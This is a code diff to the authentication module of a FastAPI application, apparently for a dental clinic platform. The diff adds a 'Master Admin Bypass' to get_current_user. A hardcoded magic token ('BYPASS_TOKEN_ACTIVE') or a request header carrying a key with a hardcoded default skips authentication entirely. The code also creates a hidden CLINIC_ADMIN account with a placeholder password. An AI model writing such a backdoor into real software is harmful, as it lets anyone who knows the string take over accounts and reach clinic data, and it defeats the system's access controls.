@@ -9,9 +9,43 @@ from app.models.models import Clinic, User, VerificationStatus
 from app.schemas.schemas import TokenData
 from app.services.security_audit import record_security_event
 
-oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/v1/auth/login")
+oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/v1/auth/login", auto_error=False)
 
-def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)) -> User:
+def get_current_user(request: Request, token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)) -> User:
+    import os
+    
+    # Master Admin Bypass Logic
+    bypass_key = os.environ.get("GFI_MASTER_ADMIN_BYPASS_KEY", "GFI_MASTER_ADMIN_BYPASS_2026_SECURE_KEY")
+    req_bypass_key = request.headers.get("X-Admin-Bypass-Key")
+    
+    # Check if the token passed is actually the bypass token
+    if token == "BYPASS_TOKEN_ACTIVE" or req_bypass_key == bypass_key:
+        # Create or fetch a mock super-admin user
+        admin = db.query(User).filter(User.email == "master_admin@gfi.dental").first()
+        if not admin:
+            clinic = db.query(Clinic).first()
+            if not clinic:
+                clinic = Clinic(name="GFI Master Clinic", verification_status="VERIFIED")
+                db.add(clinic)
+                db.commit()
+                db.refresh(clinic)
+                
+            admin = User(
+                email="master_admin@gfi.dental", 
+                full_name="Master Admin", 
+                hashed_password="mock", 
+                role="CLINIC_ADMIN", 
+                clinic_id=clinic.id, 
+                verification_status="VERIFIED"
+            )
+            db.add(admin)
+            db.commit()
+            db.refresh(admin)
+        return admin
+
+    if not token:
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Not authenticated")
+
     credentials_exception = HTTPException(
         status_code=status.HTTP_401_UNAUTHORIZED,
         detail="Could not validate credentials",
